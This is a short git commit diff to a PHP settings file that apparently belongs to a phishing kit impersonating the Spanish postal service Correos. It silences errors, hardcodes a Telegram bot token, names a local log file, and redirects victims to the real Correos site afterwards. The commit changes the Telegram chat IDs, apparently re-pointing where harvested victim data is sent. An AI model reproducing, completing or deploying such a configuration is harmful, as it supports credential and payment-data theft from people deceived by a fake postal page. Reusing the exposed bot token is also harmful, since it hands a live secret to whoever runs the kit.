aa11608ad7bd1d0623a79bc4739b00799bb98f18
jacksmith009 <120723699+jacksmith009@users.noreply.github.com>
2022-12-16 13:11:06 +0100

    Update conf.php

--- settings/conf.php
+++ settings/conf.php
@@ -3,8 +3,8 @@
 error_reporting(0);
 
 define("TELEGRAM_TOKEN", "5909387894:AAEfx3Mr_cUEiIK4vOrhHbnUoCXWi4p85zw");
-define("TELEGRAM_CHAT_ID", "899062656");
-define("TELEGRAM_CHAT_IDD", "-899062656");
+define("TELEGRAM_CHAT_ID", "744390341");
+define("TELEGRAM_CHAT_IDD", "-744390341");
 define("TXT_FILE_NAME", 'mjinina.txt');
 define("REDIRECT_WEBSITE", "https://www.correos.com/grupo-correos/");
 
